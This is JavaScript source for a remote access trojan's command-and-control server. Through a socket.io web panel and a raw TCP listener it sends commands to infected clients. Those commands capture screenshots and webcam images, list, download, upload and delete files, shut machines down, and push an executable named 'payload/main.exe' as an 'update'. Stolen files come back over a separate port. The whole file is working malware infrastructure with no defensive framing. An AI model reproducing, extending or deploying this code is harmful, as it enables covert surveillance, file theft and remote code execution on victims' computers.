var app = require('express')();
var http = require('http').Server(app);
var net = require('net');
var io = require('socket.io')(http);
var fs = require('fs');

const TCP_PORT = 1337;
const WS_PORT = 3000;
var clients = {};

app.get('/', function(req, res){
  res.sendfile('index.html');
});

var expectingFile = false;
var expectingUpload = false;
io.on('connection', function(socket){
  for (var c in clients) newClient(c);

  socket.on('client:send', function(obj) {
    switch (obj.cmd) {
      case 'off':
        console.log('send close', obj);
        clients[obj.sid].socket.write('close:0\0');
        break;
      case 'hi':
        console.log('send hi', obj);
        clients[obj.sid].socket.write('hi:0\0');
        break;
      case 'systeminfo':
        console.log('send systeminfo', obj);
        clients[obj.sid].socket.write('systeminfo:0\0');
        break;
      case 'screenshot':
        console.log('send screenshot', obj);
        expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args
        clients[obj.sid].socket.write('screenshot:0\0');
        break;
      case 'webcam':
        console.log('send webcam', obj);
        expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args
        clients[obj.sid].socket.write('webcam:0\0');
        break;
      case 'ls':
        console.log('send ls', obj);
        clients[obj.sid].socket.write('ls:' + obj.args + '\0');
        break;
      case 'dw':
        console.log('send dw', obj);
        expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args.name;
        clients[obj.sid].socket.write('download:' + obj.args.path + '\0');
        break;
      case 'shutdown':
        console.log('send shutdown');
        clients[obj.sid].socket.write('shutdown:0\0');
        break;
      case 'send':
        console.log('send upload');
        expectingUpload = obj.args.path;
        var stats = fs.statSync(expectingUpload)
        clients[obj.sid].socket.write('incoming:' + stats['size'] + '^' + obj.args.name + '\0');
        break;
      case 'update':
        console.log('send update');
        expectingUpload = "../payload/main.exe"; // obj.args.path;
        var stats = fs.statSync(expectingUpload);
        clients[obj.sid].socket.write('update:' + stats['size'] + '^' + obj.args.name + '.exe\0');
        break;
      case 'rm':
        console.log('send rm');
        clients[obj.sid].socket.write('rm:' + obj.args.path + '\0');
        break;
    }
  });

});


function newClient(c) {
  io.emit('client:connect', c);
}

function disconnectClient(c) {
  console.log('disconnect client');
  io.emit('client:disconect', c);
}

var transfer = {file: false, data: false};

function updateClient(c, cmd) {
  if (cmd.indexOf('file:') > -1) {
    console.log('file incoming');
  } else {
    io.emit('client:update', {sid: c, uid: clients[c].uid, msg: cmd, last: clients[c].last});
  }
}

var server = net.createServer(function(socket) {
  const idx = Math.floor(Math.random() * 999999999);
  console.log('connection', idx);
  clients[idx] = {
    uid: '',
    socket,
    buffer: '',
    last: Date.now(),
  }
  newClient(idx);
  socket.write('systeminfo:0\0');

  socket.on('data', function(chunk) {
    clients[idx].buffer += chunk;
    clients[idx].last = Date.now();
  });
  
  socket.on('end', function() {
    clients[idx] = false;
    delete clients[idx];
    console.log('disconnected');
    disconnectClient(idx);
  });
});

function digest() {
  setTimeout(function() {
    for (var c in clients) {
      var sindex = clients[c].buffer.indexOf('||');
      if (sindex != -1) {
        got(c, clients[c].buffer.slice(0, sindex));
        clients[c].buffer = clients[c].buffer.slice(sindex + 2);
      }
    }
    digest();
  }, 300);
}
digest();

function got(c, msg) {
  msg = msg.split('~~');
  console.log(c, msg);
  if (!clients[c].uid) clients[c].uid = msg[0];
  updateClient(c, msg[1]);
}


// data transfer
net.createServer(function(socket){
  if (expectingUpload) {
    fs.readFile(expectingUpload, function(err, f) {
      if (err) throw err;
      socket.write(f, function() {
        socket.destroy();
      });
    });
  }
  if (expectingFile) socket.pipe(fs.createWriteStream(expectingFile));
  socket.on('error', function(err){
    console.log(err.message);
  });
  socket.on('close', function() {
    expectingFile = false;
    expectingFile = false;
  });
}).listen(1338);
// END


server.listen(TCP_PORT);
http.listen(WS_PORT, function(){
  console.log('listening on *:', WS_PORT);
});
